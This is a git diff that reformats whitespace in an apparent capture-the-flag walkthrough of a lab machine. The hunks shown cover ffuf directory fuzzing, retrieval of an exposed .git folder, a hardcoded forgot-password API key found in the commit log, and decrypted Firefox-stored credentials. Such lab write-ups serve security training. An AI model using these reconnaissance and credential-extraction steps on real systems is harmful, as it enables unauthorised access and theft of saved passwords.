@@ -9,9 +9,9 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 80   | HTTP    |
-| 8081 | HTTP    |
+| 22 | SSH |
+| 80 | HTTP |
+| 8081 | HTTP |
 
 
 
@@ -27,27 +27,27 @@ We can try fuzzing:
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.153.96/FUZZ" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.153.96/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Method : GET
+ :: URL : http://10.10.153.96/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-old                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 391ms]
+old [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 391ms]
 ```
 
 
@@ -65,30 +65,30 @@ We can try fuzzing further on the directory:
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.153.96/old/FUZZ" -ic -c -t 200 -e .git,.php,.html,.js
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.153.96/old/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
- :: Extensions       : .git .php .html .js
+ :: Method : GET
+ :: URL : http://10.10.153.96/old/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions : .git .php .html .js
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-.git                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 163ms]
-.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 399ms]
-templates               [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 160ms]
+.git [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 163ms]
+.html [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 399ms]
+templates [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 160ms]
 ```
 
 We got a `.git` folder, let's get it using `GitHack` and check the contents:
@@ -105,12 +105,12 @@ We can now grep it to search if we got any password or key:
 
 ```bash
 cat log.txt | grep "key"
--    xhttp.send('{"key":"NULL"}')       //Removed the API Key to stop the forget password functionality
--    if(data['key']=='7454c262d0d5a3a0c0b678d6c0dbc7ef'):
--    if(data['key']=='abcd'):
-+    if(data['key']=='7454c262d0d5a3a0c0b678d6c0dbc7ef'):
-+    xhttp.send('{"key":"NULL"}')       //Removed the API Key to stop the forget password functionality
-+    if(data['key']=='abcd'):
+- xhttp.send('{"key":"NULL"}') //Removed the API Key to stop the forget password functionality
+- if(data['key']=='7454c262d0d5a3a0c0b678d6c0dbc7ef'):
+- if(data['key']=='abcd'):
++ if(data['key']=='7454c262d0d5a3a0c0b678d6c0dbc7ef'):
++ xhttp.send('{"key":"NULL"}') //Removed the API Key to stop the forget password functionality
++ if(data['key']=='abcd'):
 ```
 
 We got some sort of key, it says it can be used at the forgot password functionality, let's go to the other website and check it out:
@@ -217,7 +217,7 @@ Select the Mozilla profile you wish to decrypt
 
 Primary Password for profile ../firefox/0ryxwn4c.default-release:
 
-Website:   https://incognito.com
+Website: https://incognito.com
 Username: 'dev'
 Password: 'Pas$w0RD59247'
 ```
